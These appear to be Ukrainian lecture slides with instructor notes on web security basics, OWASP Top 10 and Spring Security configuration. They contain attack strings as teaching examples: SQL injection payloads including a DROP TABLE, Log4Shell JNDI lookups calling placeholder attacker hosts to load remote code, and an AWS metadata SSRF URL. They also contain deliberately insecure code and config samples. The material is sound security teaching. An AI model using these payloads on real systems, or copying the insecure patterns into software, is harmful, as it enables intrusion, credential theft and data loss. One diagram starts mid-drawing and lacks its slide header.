## Слайд 1.1 — Навіщо потрібна безпека?

**Ситуація:** ви написали REST API, задеплоїли, все працює. Що може піти не так?

- Будь-хто може викликати будь-який endpoint
- Дані користувачів доступні без обмежень
- Немає контролю хто що робить у системі

**Реальний приклад:** 2021 рік — витік даних Facebook (533 млн записів) через незахищений API

> Безпека — це не "фіча", це вимога. Як фундамент у будинку — без нього все решта не має сенсу.

### Пояснення для викладача:

Почніть з простого питання аудиторії: "Хто з вас коли-небудь деплоїв додаток без будь-якої безпеки?" — це нормально для навчальних проектів, але в production це катастрофа.

Покажіть реальну ситуацію: ви написали REST API з ендпоінтом `GET /api/users` — і він повертає список усіх користувачів з email, телефонами, адресами. Поки ви не додали Security — будь-хто в інтернеті може зробити curl-запит і отримати ці дані. Бот, конкурент, хакер — будь-хто.

Приклад з Facebook: у 2021 році зловмисники знайшли API endpoint, який дозволяв за номером телефону отримати дані профілю. Вони просто перебрали мільйони номерів (це називається enumeration attack) і зібрали дані 533 мільйонів акаунтів. Причина — не було rate limiting і не було перевірки хто робить запит.

Ключова думка: безпека — це не щось, що "додають потім". Це частина архітектури, як і база даних або REST контролери. Spring Boot допомагає нам з цим, але треба розуміти що і навіщо ми налаштовуємо.

## Слайд 1.2 — Authentication vs Authorization

```
Authentication (AuthN)          Authorization (AuthZ)
─────────────────────          ─────────────────────
"Хто ти?"                      "Що тобі дозволено?"
─────────────────────          ─────────────────────
Логін + пароль                 Ролі та дозволи
Токен (JWT)                    ACL (Access Control List)
Сертифікат                     RBAC, ABAC
Біометрія                      Policy-based
─────────────────────          ─────────────────────
Відбувається ПЕРШОЮ            Відбувається ПІСЛЯ AuthN
```

**Аналогія:**
- **AuthN** — охоронець на вході перевіряє ваш паспорт (хто ви?)
- **AuthZ** — система пропусків визначає на який поверх вам можна (що дозволено?)

### Пояснення для викладача:

Це два найважливіших терміни, які студенти часто плутають. Потрібно чітко розділити їх і зафіксувати різницю.

**Authentication (автентифікація)** — це процес підтвердження особи. Система запитує: "Хто ти?" і користувач доводить свою ідентичність. Це може бути логін+пароль, відбиток пальця, смарт-картка, токен — будь-що, що доводить що ви — це ви. Після успішної автентифікації система знає ХТО зробив запит.

**Authorization (авторизація)** — це процес визначення прав. Система вже знає хто ви (пройшли AuthN), тепер вирішує: "А чи маєш ти право робити ЦЮ дію?". Наприклад, звичайний користувач може переглядати товари, але не може їх видаляти — це може тільки адмін.

**Порядок завжди один:** спочатку AuthN, потім AuthZ. Не можна перевірити права, якщо не знаєш хто перед тобою. Це як у реальному житті: спочатку охоронець дивиться на ваш бейдж (AuthN), і лише потім перевіряє чи маєте ви доступ до конкретної кімнати (AuthZ).

**Розширена аналогія з офісним центром:**
Уявіть великий бізнес-центр. На вході стоїть охоронець (Authentication). Ви показуєте йому пропуск — він бачить ваше фото, ім'я, компанію. Тепер він знає ХТО ви. Але це не означає, що ви можете зайти куди завгодно. На кожному поверсі є система контролю доступу (Authorization) — ваш пропуск відкриває двері лише на 3-й і 5-й поверхи, бо ви працюєте у відділі маркетингу. Серверна на 10-му поверсі — тільки для IT-адмінів.

Якщо AuthN провалюється (невірний пароль) — сервер повертає **401 Unauthorized** (так, назва заплутана, але це саме про автентифікацію). Якщо AuthZ провалюється (немає прав) — сервер повертає **403 Forbidden**.

## Слайд 1.3 — Типи Authentication

| Тип | Як працює | Де використовується |
|-----|-----------|---------------------|
| **Basic Auth** | Login:Password у кожному запиті (Base64) | Внутрішні API, dev |
| **Session-based** | Сервер зберігає стан у HttpSession + Cookie | Класичні web-додатки |
| **Token-based** | Клієнт зберігає токен, сервер — stateless | REST API, SPA, Mobile |
| **Certificate** | mTLS — обидві сторони мають сертифікат | Міжсервісна комунікація |

```
Session-based:                    Token-based:
┌────────┐    Cookie/JSESSIONID   ┌────────┐    Authorization: Bearer <token>
│ Client │ ◄──────────────────►   │ Client │ ◄──────────────────────────────►
└────────┘                        └────────┘
    │                                  │
    ▼                                  ▼
┌────────┐  Session Store         ┌────────┐  Stateless — нічого
│ Server │ ──► HttpSession        │ Server │  не зберігає
└────────┘                        └────────┘
```

> У мікросервісній архітектурі Session-based — це проблема. Token-based — стандарт.

### Пояснення для викладача:

Тут потрібно детально пояснити різницю між двома основними підходами — Session-based та Token-based, бо це фундамент для розуміння JWT та OAuth далі.

**Basic Auth** — найпростіший спосіб. Клієнт при кожному запиті передає логін і пароль, закодовані в Base64, у заголовку `Authorization: Basic dXNlcjpwYXNz`. Base64 — це НЕ шифрування, це просто кодування. Будь-хто може декодувати і побачити пароль. Тому Basic Auth використовують тільки через HTTPS і тільки для простих внутрішніх API або під час розробки. У production для публічних API — це погана ідея, бо пароль летить у кожному запиті.

**Session-based автентифікація — як це працює крок за кроком:**

1. Клієнт надсилає логін і пароль (POST /login)
2. Сервер перевіряє credentials, якщо ОК — створює **HttpSession** — об'єкт у пам'яті сервера (або в Redis/БД), який зберігає інформацію про користувача
3. Сервер генерує унікальний ідентифікатор сесії — **JSESSIONID** (наприклад, `ABC123DEF456`)
4. Сервер повертає цей JSESSIONID у **Cookie** (заголовок `Set-Cookie: JSESSIONID=ABC123DEF456`)
5. Браузер автоматично зберігає цей Cookie і надсилає його з КОЖНИМ наступним запитом
6. Сервер отримує JSESSIONID з Cookie, знаходить відповідну сесію у своєму сховищі, і знає хто зробив запит

**Проблема Session-based у мікросервісах:** сесія зберігається на КОНКРЕТНОМУ сервері. Якщо у вас 5 інстансів сервісу за load balancer, і запит користувача потрапив на інший інстанс — там немає його сесії! Рішення є (sticky sessions, Redis session store), але вони додають складність. Уявіть: у вас 20 мікросервісів — кожен повинен мати доступ до session store, це кошмар.

**Token-based автентифікація — як це працює крок за кроком:**

1. Клієнт надсилає логін і пароль (POST /api/auth/login)
2. Сервер перевіряє credentials, якщо ОК — генерує **токен** (наприклад, JWT)
3. Токен містить всю необхідну інформацію ВСЕРЕДИНІ себе: хто це, які ролі, коли закінчується
4. Сервер повертає токен у response body: `{ "token": "eyJhbG..." }`
5. Клієнт зберігає токен (у пам'яті, localStorage, або secure cookie)
6. При кожному запиті клієнт додає заголовок `Authorization: Bearer eyJhbG...`
7. Сервер отримує токен, перевіряє його підпис (не змінений?) та термін дії, витягує інформацію — і все. Нічого не зберігає.

**Ключова різниця:** при session-based сервер ЗБЕРІГАЄ стан (stateful) — він пам'ятає кожного користувача. При token-based сервер НЕ зберігає стан (stateless) — вся інформація вже є в токені. Це як різниця між клубною карткою (сесія — клуб пам'ятає вас у своїй базі) та паспортом (токен — вся інформація з вами, будь-яка країна може її прочитати).

**Certificate-based (mTLS):** у звичайному HTTPS тільки сервер має сертифікат (клієнт перевіряє що сервер справжній). У mTLS (mutual TLS) — обидві сторони мають сертифікати і перевіряють одна одну. Використовується для міжсервісної комунікації в мікросервісах, коли потрібен максимальний рівень довіри між сервісами.

## Слайд 1.4 — Типи Authorization

**RBAC — Role-Based Access Control (контроль доступу на основі ролей):**
```
User ──► Role ──► Permissions

Приклад:
  admin  ──► ROLE_ADMIN  ──► [READ, WRITE, DELETE]
  user   ──► ROLE_USER   ──► [READ]
  editor ──► ROLE_EDITOR ──► [READ, WRITE]
```

**ABAC — Attribute-Based Access Control (контроль доступу на основі атрибутів):**
```
Рішення базується на атрибутах:
  - Хто? (user.department = "finance")
  - Що? (resource.type = "report")
  - Де? (context.ip IN company_network)
  - Коли? (time BETWEEN 9:00 AND 18:00)
```

**Коли що використовувати:**
- **RBAC** — 90% випадків, простий і зрозумілий
- **ABAC** — коли RBAC недостатньо (складні бізнес-правила)

### Пояснення для викладача:

#### Навіщо взагалі потрібні ролі (ROLE)?

Уявіть інтернет-магазин без ролей. У вас є 50 ендпоінтів і 1000 користувачів. Без ролей вам довелося б для КОЖНОГО користувача окремо прописувати: "Іван може GET /products, POST /products, DELETE /products, GET /orders...". Це 1000 користувачів x 50 ендпоінтів = 50 000 записів. Додали нового менеджера — вручну налаштовуєте 50 дозволів.

Ролі вирішують це елегантно: ви створюєте РОЛЬ (шаблон дозволів) і просто призначаєте її користувачу. Замість 50 окремих дозволів — одна роль "MANAGER".

#### RBAC — Role-Based Access Control (детально)

RBAC — це найпоширеніша модель авторизації. Ідея проста: ви не призначаєте дозволи кожному користувачу окремо, а створюєте РОЛІ — іменовані групи дозволів — і призначаєте ролі користувачам.

**Як це працює на прикладі інтернет-магазину:**

```
ROLE_CUSTOMER:
  - GET /api/products       (переглядати товари)
  - POST /api/orders        (створювати замовлення)
  - GET /api/orders/my      (бачити свої замовлення)

ROLE_MANAGER:
  - все що CUSTOMER +
  - POST /api/products      (додавати товари)
  - PUT /api/products/{id}  (редагувати товари)
  - GET /api/orders         (бачити ВСІ замовлення)

ROLE_ADMIN:
  - все що MANAGER +
  - DELETE /api/products    (видаляти товари)
  - GET /api/users          (керувати користувачами)
  - POST /api/users/roles   (призначати ролі)
```

У Spring Security ролі — це спеціальний тип `GrantedAuthority` з префіксом `ROLE_`. Коли ви пишете `.hasRole("ADMIN")`, Spring автоматично додає префікс і перевіряє `ROLE_ADMIN`. Є також `.hasAuthority("ROLE_ADMIN")` — те саме, але без автоматичного префікса.

**Переваги RBAC:**
- Простота — легко зрозуміти і реалізувати
- Масштабованість — новий співробітник отримує роль, а не 50 дозволів
- Аудит — легко побачити хто що може робити
- Типовість — більшість фреймворків (включно з Spring Security) підтримують RBAC "з коробки"

**Обмеження RBAC — коли його недостатньо:**
Уявіть банківську систему. Правило: "Менеджер може схвалити кредит до 100 000 грн, але тільки якщо клієнт з його відділення, і тільки в робочий час, і тільки якщо він не схвалював кредит цьому ж клієнту протягом останніх 30 днів". Роль "МЕНЕДЖЕР" тут не допоможе — потрібна перевірка багатьох атрибутів одночасно. Тут починається ABAC.

#### ABAC — Attribute-Based Access Control (детально)

ABAC — це більш гнучка модель, де рішення про доступ приймається на основі атрибутів (властивостей) чотирьох категорій:

**1. Атрибути суб'єкта (хто?)** — властивості користувача:
  - department = "finance"
  - clearance_level = "SECRET"
  - years_of_experience >= 5
  - location = "Ukraine"

**2. Атрибути ресурсу (що?)** — властивості того, до чого хочуть отримати доступ:
  - resource.type = "financial_report"
  - resource.classification = "CONFIDENTIAL"
  - resource.owner = "department_X"
  - document.amount > 10000

**3. Атрибути дії (як?)** — тип операції:
  - action = "READ" / "WRITE" / "DELETE" / "APPROVE"

**4. Атрибути контексту (де/коли?)** — обставини запиту:
  - time BETWEEN 09:00 AND 18:00
  - ip_address IN company_network
  - device.type = "corporate_laptop"
  - mfa_verified = true

**Приклад ABAC-політики словами:**
"Дозволити APPROVE фінансовий документ, ЯКЩО: користувач з відділу фінансів, І його рівень доступу >= "SENIOR", І сума документа <= ліміт користувача, І зараз робочий час, І запит з корпоративної мережі."

У Spring Security ABAC реалізується через SpEL-вирази в `@PreAuthorize`:
```java
@PreAuthorize("@accessChecker.canApprove(authentication, #document)")
```

#### Порівняння RBAC vs ABAC

| Критерій | RBAC | ABAC |
|----------|------|------|
| Складність | Проста | Висока |
| Гнучкість | Обмежена | Максимальна |
| Продуктивність | Швидка перевірка | Може бути повільною |
| Типовий випадок | Веб-додатки, API | Банки, медицина, держсектор |
| Spring Support | `hasRole()`, `hasAuthority()` | `@PreAuthorize` з SpEL |

**Практична порада:** починайте завжди з RBAC. У 90% проектів його достатньо. Переходьте на ABAC тільки коли відчуєте, що кількість ролей вибухає або правила стають занадто складними.

## Слайд 1.5 — OWASP Top 10 (2021)

**OWASP** — Open Web Application Security Project

| # | Загроза | Приклад |
|---|---------|---------|
| **A01** | **Broken Access Control** | Користувач змінює `/api/users/1` на `/api/users/2` і бачить чужі дані |
| **A02** | **Cryptographic Failures** | Паролі зберігаються у відкритому вигляді |
| **A03** | **Injection** | SQL: `' OR 1=1 --` у полі логіну |
| **A04** | **Insecure Design** | Відсутність rate limiting на endpoint відновлення паролю |
| **A05** | **Security Misconfiguration** | Debug mode у production, default credentials |
| **A06** | **Vulnerable Components** | Використання Log4j з CVE-2021-44228 |
| **A07** | **Auth Failures** | Brute-force атака без блокування |
| **A08** | **Software/Data Integrity** | Підміна CI/CD pipeline або залежностей |
| **A09** | **Logging Failures** | Зламали систему, а в логах — пусто |
| **A10** | **SSRF** | Сервер робить запит на внутрішній URL зловмисника |

### Пояснення для викладача:

#### Що таке OWASP?

OWASP (Open Web Application Security Project) — це некомерційна міжнародна організація, яка займається безпекою веб-додатків. Заснована у 2001 році. Це спільнота тисяч волонтерів — розробників, безпековців, дослідників з усього світу. Вони створюють безкоштовні інструменти, документацію та стандарти безпеки.

OWASP Top 10 — це їхній найвідоміший проект. Це список з 10 найкритичніших ризиків безпеки веб-додатків, який оновлюється кожні 3-4 роки (остання версія — 2021). Цей список де-факто став стандартом: на нього посилаються аудитори безпеки, він є частиною багатьох compliance-вимог (PCI DSS, SOC 2), і його знання очікується від кожного senior-розробника на інтерв'ю.

#### Детальний розбір кожної вразливості:

**A01 — Broken Access Control (Порушення контролю доступу):**
Це вразливість №1 з 2021 року. Суть: користувач може робити те, що йому не дозволено. Найпростіший приклад — IDOR (Insecure Direct Object Reference). Користувач Іван авторизований і робить запит `GET /api/orders/15` — бачить своє замовлення. Потім міняє URL на `GET /api/orders/16` — і бачить замовлення Марії. Сервер не перевірив, чи належить замовлення №16 Івану.

Інші приклади: зміна ролі через manipulation запиту (`POST /api/users {"role": "admin"}`), доступ до адмін-панелі просто за URL `/admin`, горизонтальна ескалація привілеїв (один user бачить дані іншого user-а того ж рівня).

**A02 — Cryptographic Failures (Криптографічні помилки):**
Раніше називалося "Sensitive Data Exposure". Суть: чутливі дані не захищені належним чином. Паролі зберігаються у відкритому вигляді або захешовані слабким алгоритмом (MD5, SHA1 без salt). Дані передаються по HTTP замість HTTPS. Ключі шифрування захардкоджені в коді і потрапляють у git-репозиторій. API повертає повний об'єкт користувача з паролем замість DTO без пароля.

**A03 — Injection (Ін'єкції):**
SQL Injection — класика. Як працює: у вас є запит `"SELECT * FROM users WHERE name = '" + userInput + "'"`. Зловмисник вводить у поле name: `' OR 1=1 --`. Результат: `SELECT * FROM users WHERE name = '' OR 1=1 --'`. Вираз `1=1` завжди true, `--` коментує решту запиту. Результат — повертаються ВСІ користувачі. Можна піти далі: `'; DROP TABLE users; --` — і таблиця видалена.

Крім SQL бувають: NoSQL injection, LDAP injection, OS command injection, XSS (Cross-Site Scripting — ін'єкція JavaScript у сторінку). Spring Data JPA захищає від SQL injection автоматично через параметризовані запити — JPQL з `:param` або method names. Але якщо ви пишете native query через конкатенацію рядків — Spring вас не врятує.

**A04 — Insecure Design (Небезпечне проектування):**
Це НЕ про баги в коді, а про помилки в дизайні системи. Приклад: endpoint відновлення паролю `/api/password-reset` приймає email, генерує код з 4 цифр і надсилає на пошту. Проблема: 4 цифри = 10 000 комбінацій. Без rate limiting зловмисник перебирає всі за кілька хвилин. Навіть якщо код написаний ідеально — дизайн системи небезпечний. Правильний дизайн: довший код (6+ символів), обмеження спроб (максимум 5), блокування після невдач, термін дії коду (10 хвилин).

**A05 — Security Misconfiguration (Неправильна конфігурація безпеки):**
Одна з найпоширеніших проблем. Приклади: залишений debug mode у production (Spring Boot Actuator показує всі beans, env variables, heap dump). Дефолтні credentials (admin/admin у базі, адмін-панелі). H2 Console доступна у production (`/h2-console`). Stack trace з деталями реалізації повертається клієнту в error response. CORS дозволяє запити з будь-якого origin (`*`). Відкриті Actuator endpoints (`/actuator/env`, `/actuator/heapdump`).

**A06 — Vulnerable and Outdated Components (Вразливі компоненти):**
Найяскравіший приклад — **Log4Shell (CVE-2021-44228)**, грудень 2021 року. Log4j — це бібліотека логування для Java, яку використовують мільйони додатків. У неї знайшли критичну вразливість: якщо в лог потрапляє спеціальний рядок `${jndi:ldap://attacker.com/exploit}`, Log4j намагається завантажити Java-клас з зовнішнього сервера зловмисника і виконати його. Це дає повний контроль над сервером.

Як це працювало: зловмисник відправляє HTTP-запит з заголовком `User-Agent: ${jndi:ldap://evil.com/a}`. Ваш додаток логує цей запит: `log.info("Request from: " + request.getHeader("User-Agent"))`. Log4j бачить `${jndi:...}`, виконує JNDI lookup, завантажує код зловмисника — і все, сервер скомпрометований.

Масштаб: вразливість отримала оцінку 10.0 з 10.0 (максимально критична). Вразливими були Apache, Amazon, Google, Microsoft, Twitter — практично всі. Фікс: оновити Log4j до версії 2.17.0+. Ось чому важливо тримати залежності актуальними. Spring Boot BOM та Dependabot допомагають з цим.

**A07 — Identification and Authentication Failures (Помилки автентифікації):**
**Brute-force атака** — зловмисник автоматично перебирає паролі. Як це працює: бот відправляє тисячі запитів POST /login з різними паролями. Якщо ваш API відповідає "неправильний пароль" без обмежень — рано чи пізно правильний пароль буде знайдений.

Різновиди brute-force:
- **Простий перебір:** aaa, aab, aac... — повільно, але гарантовано знайде
- **Dictionary attack:** перебір зі словника популярних паролів (123456, password, qwerty...) — список топ-1000 паролів покриває ~90% акаунтів зі слабкими паролями
- **Credential stuffing:** використання пар email:password з попередніх витоків (люди часто використовують однаковий пароль на різних сайтах)
- **Password spraying:** один пароль (наприклад "Company2024!") перебирається для багатьох акаунтів

Захист від brute-force: rate limiting (максимум 5 спроб на хвилину), блокування акаунту після 10 невдач, CAPTCHA, прогресивна затримка (після кожної невдачі час очікування збільшується: 1с, 2с, 4с, 8с...), двофакторна автентифікація (2FA).

Інші проблеми A07: дозвіл слабких паролів (менше 8 символів), відсутність 2FA для критичних операцій, зберігання паролів у відкритому вигляді або з MD5.

**A08 — Software and Data Integrity Failures (Порушення цілісності):**
Приклад: ваш CI/CD pipeline (GitHub Actions) автоматично деплоїть код на production. Зловмисник отримує доступ до вашого GitHub і змінює workflow — тепер при кожному деплої виконується його шкідливий код. Або: ваш додаток завантажує залежності з npm/Maven без перевірки — зловмисник публікує пакет з подібною назвою (typosquatting), і ви випадково підключаєте шкідливий код. Відомий випадок — `event-stream` у npm (2018): популярний пакет з 2 млн завантажень на тиждень отримав шкідливе оновлення, яке крало криптовалюту.

**A09 — Security Logging and Monitoring Failures (Помилки логування):**
Ситуація: хакер зламав ваш додаток 3 місяці тому, весь цей час крав дані. Ви дізнаєтесь тільки коли клієнти починають скаржитись. Дивитесь логи — а там нічого корисного, тільки `INFO` повідомлення про старт додатку. Не логувалися: невдалі спроби логіну, зміни привілеїв, доступ до чутливих даних, помилки валідації. Правило: логуйте все, що стосується безпеки. Невдалий логін — лог. Зміна паролю — лог. Доступ до адмін-ендпоінту — лог. І налаштуйте алерти на аномалії.

**A10 — Server-Side Request Forgery (SSRF):**
Суть: зловмисник змушує ваш сервер робити HTTP-запити до ресурсів, до яких він не повинен мати доступ. Приклад: у вас є endpoint, який приймає URL і повертає скріншот сторінки (або вміст). Зловмисник передає `http://169.254.169.254/latest/meta-data/` — це внутрішній endpoint AWS, який повертає credentials інстансу. Ваш сервер знаходиться всередині мережі AWS — він має доступ до цієї адреси, клієнт ззовні — ні. Через SSRF зловмисник "дістає" внутрішні дані через ваш сервер як проксі.

## Слайд 1.6 — Топ-5 загроз для Spring Boot розробника

### 1. Broken Access Control (A01)
```java
// ПОГАНО — перевіряємо тільки AuthN, не AuthZ
@GetMapping("/api/users/{id}")
public User getUser(@PathVariable Long id) {
    return userRepository.findById(id).orElseThrow(); // будь-хто бачить будь-кого
}

// ДОБРЕ — перевіряємо що користувач має доступ
@GetMapping("/api/users/{id}")
@PreAuthorize("#id == authentication.principal.id or hasRole('ADMIN')")
public User getUser(@PathVariable Long id) {
    return userRepository.findById(id).orElseThrow();
}
```

### 2. SQL Injection (A03)
```java
// ПОГАНО — конкатенація
String query = "SELECT * FROM users WHERE name = '" + name + "'";

// ДОБРЕ — параметризовані запити (Spring Data JPA робить це автоматично)
@Query("SELECT u FROM User u WHERE u.name = :name")
User findByName(@Param("name") String name);
```

### 3. Security Misconfiguration (A05)
```yaml
# ПОГАНО — у production
spring:
  h2:
    console:
      enabled: true    # H2 Console відкрита
  devtools:
    restart:
      enabled: true    # DevTools у prod
management:
  endpoints:
    web:
      exposure:
        include: "*"   # Всі Actuator endpoints відкриті
```

### Пояснення для викладача:

#### Розбір @PreAuthorize — що тут відбувається:

```java
@PreAuthorize("#id == authentication.principal.id or hasRole('ADMIN')")
```

Ця анотація — одна з найпотужніших у Spring Security. Розберемо кожен елемент:

**`@PreAuthorize`** — анотація, яка виконує перевірку ПЕРЕД (pre) виконанням методу. Якщо вираз повертає `false` — метод НЕ виконається, а клієнт отримає 403 Forbidden. Вираз написаний на SpEL (Spring Expression Language).

**`#id`** — це параметр методу. Символ `#` дозволяє звертатися до параметрів методу за іменем. У нашому випадку `#id` — це значення з `@PathVariable Long id`. Тобто якщо запит `GET /api/users/42`, то `#id = 42`.

**`authentication`** — це об'єкт `Authentication` з Spring Security, який представляє поточного автентифікованого користувача. Він автоматично доступний у SpEL-виразах. Він містить:
- `getName()` — ім'я користувача
- `getPrincipal()` — об'єкт Principal (зазвичай UserDetails)
- `getAuthorities()` — колекція ролей/дозволів
- `getCredentials()` — credentials (зазвичай пароль, але часто null після автентифікації)

**`authentication.principal`** — це **Principal** — центральний об'єкт, який представляє "хто зараз працює в системі". У Spring Security principal — це зазвичай об'єкт `UserDetails` (або його наслідник), який ви повернули з `UserDetailsService.loadUserByUsername()`.

Що таке Principal у загальному сенсі? Термін прийшов з Java Security API. Principal — це "той, хто має ідентичність". У контексті веб-додатку — це об'єкт з інформацією про поточного користувача: його ID, username, ролі тощо.

**`authentication.principal.id`** — це ID поточного автентифікованого користувача. Якщо ваш UserDetails-об'єкт має поле `id` (наприклад, через кастомний клас), то це значення буде доступне.

**`hasRole('ADMIN')`** — перевіряє чи має поточний користувач роль ROLE_ADMIN (Spring автоматично додає префікс ROLE_).

**Весь вираз цілком:** "Дозволити доступ, ЯКЩО id з URL збігається з id поточного користувача (тобто він дивиться свій профіль) АБО якщо користувач має роль ADMIN (адмін бачить будь-кого)".

**Конкретний сценарій:**
- Користувач Іван (id=5, role=USER) робить `GET /api/users/5` → `#id(5) == principal.id(5)` → true → дозволено
- Користувач Іван (id=5, role=USER) робить `GET /api/users/7` → `#id(7) == principal.id(5)` → false, `hasRole('ADMIN')` → false → 403 Forbidden
- Адмін Марія (id=1, role=ADMIN) робить `GET /api/users/7` → `#id(7) == principal.id(1)` → false, `hasRole('ADMIN')` → true → дозволено

#### Розбір SQL Injection:

Покажіть крок за кроком що відбувається при SQL injection:

**Нормальний запит:** Користувач вводить name = "John"
```sql
SELECT * FROM users WHERE name = 'John'
-- Повертає одного користувача — все ОК
```

**Атака:** Зловмисник вводить name = `' OR 1=1 --`
```sql
SELECT * FROM users WHERE name = '' OR 1=1 --'
-- '' OR 1=1 — завжди true для кожного рядка
-- -- коментує залишок запиту (закриваючу лапку)
-- Результат: повертаються ВСІ користувачі
```

**Деструктивна атака:** name = `'; DROP TABLE users; --`
```sql
SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
-- Перший запит нічого не повертає
-- Другий запит ВИДАЛЯЄ таблицю users
```

Чому Spring Data JPA захищає? Параметризовані запити відокремлюють SQL-код від даних. Параметр `:name` ніколи не інтерпретується як SQL — він завжди обробляється як текстове значення. Навіть якщо передати `' OR 1=1 --`, це буде просто рядок для порівняння.

#### Security Misconfiguration — чому це небезпечно:

**H2 Console** (`/h2-console`) — це веб-інтерфейс для вашої бази даних. У production це означає, що будь-хто може відкрити браузер, зайти на `your-api.com/h2-console` і виконувати SQL-запити до вашої бази. Читати дані, змінювати, видаляти.

**DevTools** — Spring Boot DevTools автоматично перезапускає додаток при змінах. У production це означає потенційне виконання коду через live reload.

**Actuator endpoints** — Spring Boot Actuator надає endpoints для моніторингу: `/actuator/env` показує ВСІ environment variables (включно з паролями до БД, API ключами), `/actuator/heapdump` дозволяє завантажити dump пам'яті (де можуть бути паролі, токени), `/actuator/beans` показує всі Spring beans (структуру додатку). Правило: у production відкривайте тільки `/actuator/health` та `/actuator/prometheus` (для моніторингу).

## Слайд 1.7 — Як Spring Boot допомагає з безпекою?

```
OWASP Загроза                  Spring Boot рішення
──────────────────────────     ──────────────────────────────────
Broken Access Control      →   Spring Security, @PreAuthorize
Cryptographic Failures     →   PasswordEncoder (BCrypt)
Injection                  →   Spring Data JPA (parameterized queries)
Security Misconfiguration  →   Actuator security, Profiles
Vulnerable Components      →   Dependabot, Spring Boot BOM
Auth Failures              →   Spring Security AuthN mechanisms
Logging Failures           →   Spring Boot Actuator + SLF4J
CSRF                       →   CsrfFilter (увімкнений за замовчуванням)
```

> Spring Boot "з коробки" вирішує багато проблем безпеки. Але тільки якщо ви розумієте як це працює.

### Пояснення для викладача:

Ключова думка цього слайду: Spring Boot — це не магічна паличка, але він дуже добре допомагає. Пройдіться по кожному рядку таблиці:

**Spring Security + @PreAuthorize** → захищає від Broken Access Control. Замість ручних перевірок `if (user.getRole().equals("ADMIN"))` у кожному контролері — декларативна безпека через анотації та конфігурацію.

**PasswordEncoder (BCrypt)** → захищає від Cryptographic Failures. BCrypt автоматично генерує salt (унікальну "сіль" для кожного пароля), робить хешування з адаптивною складністю (можна збільшувати cost factor з ростом потужності комп'ютерів). Навіть якщо зловмисник отримає базу з хешами — розшифрувати BCrypt-хеші практично неможливо.

**Spring Data JPA** → захищає від Injection. Всі запити через Repository methods (findById, findByName) та JPQL з іменованими параметрами (`:name`) автоматично параметризовані. Дані НІКОЛИ не вставляються безпосередньо в SQL-рядок.

**Actuator security + Profiles** → захищає від Security Misconfiguration. Через Spring Profiles (`application-prod.yml`) ви можете вимикати небезпечні функції у production. Actuator можна захистити Spring Security або обмежити до внутрішньої мережі.

**Spring Boot BOM** → захищає від Vulnerable Components. Spring Boot BOM (Bill of Materials) керує версіями ВСІХ транзитивних залежностей. Коли виходить security patch — оновлення однієї версії Spring Boot підтягує оновлені версії всіх залежностей.

**CsrfFilter** → CSRF (Cross-Site Request Forgery) — атака, де шкідливий сайт змушує браузер користувача відправити запит на ваш сайт (бо браузер автоматично додає cookies). Spring Security включає CSRF-захист за замовчуванням для form-based додатків. Для REST API з JWT-токенами CSRF зазвичай вимикають, бо токен не передається автоматично (на відміну від cookies).

## Слайд 2.1 — Що таке Spring Security?

- Фреймворк для AuthN та AuthZ у Spring-додатках
- De facto стандарт безпеки для Spring Boot
- Базується на **Servlet Filters** (для web-додатків)

**Підключення:**
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
```

**Що відбувається одразу після підключення:**
- ВСІ endpoints захищені (потрібна автентифікація)
- Генерується дефолтний пароль у консолі
- Створюється форма логіну `/login`
- Увімкнено CSRF захист
- Увімкнено session fixation protection

```
Консоль:
Using generated security password: 8a5f3e2b-1c4d-4f5a-9b6e-7d8c9a0b1e2f
```

### Пояснення для викладача:

Підкресліть важливий принцип Spring Security: **secure by default** (безпечний за замовчуванням). Щойно ви додали залежність `spring-boot-starter-security` — ВСЕ закрито. Це протилежність підходу "все відкрито, закриваємо що потрібно". Spring Security йде іншим шляхом: "все закрито, відкриваємо тільки те, що потрібно".

Що конкретно відбувається при додаванні starter-security:
1. Spring Boot AutoConfiguration реєструє `SecurityFilterChain` з дефолтними налаштуваннями
2. Створюється користувач `user` з випадковим паролем, який друкується в консолі
3. Всі HTTP-запити потребують автентифікації
4. Для браузерів автоматично створюється форма логіну `/login` і логауту `/logout`
5. Вмикається CSRF-захист — кожна форма повинна містити CSRF-токен
6. Вмикається захист від session fixation — при логіні створюється нова сесія (щоб зловмисник не міг "підсунути" свій session ID)

**Демонстрація (якщо є можливість):** створіть простий Spring Boot додаток з одним контролером, додайте starter-security, запустіть — і покажіть що відбувається при спробі зайти на ендпоінт. Браузер покаже форму логіну. Postman поверне 401.

**Servlet Filters** — це механізм Java EE (Jakarta EE), який дозволяє перехоплювати HTTP-запити ДО того, як вони потраплять у ваш контролер, і ПІСЛЯ того, як контролер повернув відповідь. Spring Security побудований саме на фільтрах — це ланцюг (chain) з 10-15 фільтрів, кожен з яких виконує свою задачу безпеки.

```
│         ┌──────────┼──────────┐             │
│         ▼          ▼          ▼             │
│    SecurityFilterChain  SecurityFilterChain  │  ← Може бути кілька chain
│    (pattern: /api/**)   (pattern: /**)      │
│         │                                   │
│    ┌────┼────────────────────┐              │
│    │    ▼                    │              │
│    │ CorsFilter              │              │
│    │ CsrfFilter              │              │
│    │ UsernamePasswordAuthF.  │  ← Ланцюг   │
│    │ BearerTokenAuthF.       │    фільтрів  │
│    │ AuthorizationFilter     │              │
│    │ ExceptionTranslationF.  │              │
│    └─────────────────────────┘              │
└─────────────────────────────────────────────┘
    │
    ▼
Controller (ваш код)
```

### Пояснення для викладача:

Це ключовий слайд для розуміння "як Spring Security працює під капотом". Пройдіться по діаграмі зверху вниз:

**DelegatingFilterProxy** — це міст між світом Servlet (Tomcat) і світом Spring. Tomcat нічого не знає про Spring-біни. DelegatingFilterProxy — це звичайний Servlet Filter, який Tomcat знає і викликає. Всередині він делегує роботу Spring-біну `FilterChainProxy`. Тобто це адаптер: Servlet → Spring.

**FilterChainProxy** — це центральний компонент Spring Security. Він отримує HTTP-запит і вирішує ЯКИЙ ланцюг фільтрів застосувати. Він може мати кілька `SecurityFilterChain`, кожен з яких відповідає за свій URL-патерн.

**Кілька SecurityFilterChain** — навіщо? Уявіть: для `/api/**` вам потрібна JWT-автентифікація (stateless), а для `/web/**` — form-login із сесіями. Це різні стратегії безпеки. Ви створюєте два біни `SecurityFilterChain` з різними конфігураціями. FilterChainProxy перевіряє патерни зверху вниз і застосовує перший збіг.

**Ланцюг фільтрів** — кожен фільтр у ланцюгу відповідає за одну конкретну задачу. Запит проходить через ВСІ фільтри послідовно (як конвеєр на заводі). Кожен фільтр може: пропустити запит далі, відхилити запит (наприклад, відсутній токен), або модифікувати запит (наприклад, додати інформацію про автентифікованого користувача в контекст).

